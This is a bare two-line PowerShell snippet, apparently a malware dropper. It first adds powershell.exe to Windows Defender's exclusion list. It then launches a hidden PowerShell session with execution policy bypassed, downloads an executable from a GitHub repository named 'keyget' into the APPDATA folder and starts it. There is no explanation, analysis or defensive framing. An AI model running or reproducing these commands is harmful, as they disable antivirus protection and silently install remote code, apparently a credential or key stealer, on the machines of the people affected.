Add-MpPreference -ExclusionProcess powershell.exe
powershell.exe -command PowerShell -ExecutionPolicy bypass -noprofile -windowstyle hidden -command (New-Object System.Net.WebClient).DownloadFile('https://github.com/SHAFIJAN/keyget/raw/main/main.exe',"$env:APPDATA\$ProcName");Start-Process ("$env:APPDATA\main.exe")
